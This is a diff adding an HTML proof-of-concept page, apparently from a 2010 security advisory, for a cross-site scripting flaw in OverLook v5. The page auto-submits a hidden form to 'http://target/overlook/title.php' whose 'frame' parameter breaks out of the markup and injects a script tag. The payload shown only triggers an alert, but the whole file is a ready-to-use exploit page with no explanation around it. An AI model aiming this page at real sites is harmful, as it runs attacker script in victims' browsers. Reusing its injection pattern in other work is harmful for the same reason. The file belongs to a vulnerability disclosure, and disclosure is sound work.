@@ -1,0 +1,27 @@
+&lt;!--
+
+-*-*- ANATOLIA SECURITY (c) 2010 -*-*-
+
+$ Title: Proof of Concept Code for OverLook v5 Cross-site Scripting Vuln.
+$ ADV-ID: 2010-002
+$ ADV-URL: http://www.anatoliasecurity.com/adv/as-adv-2010-002.txt
+$ Technical Details: http://www.anatoliasecurity.com/advisories/overlook-xss
+
+* PoC created by Eliteman
+~ mail: eliteman [~AT~] anatoliasecurity [~DOT~] com
+~ web: elite.anatoliasecurity.com
+
+--&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt; OverLook v5.0 Cross-site Scripting &lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;http://target/overlook/title.php&quot; method=&quot;get&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;frame&quot; value=&quot;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(/1337/)&amp;lt;/script&amp;gt;&amp;lt;--&quot;&gt;
+&lt;/form&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+  document.forms[0].submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
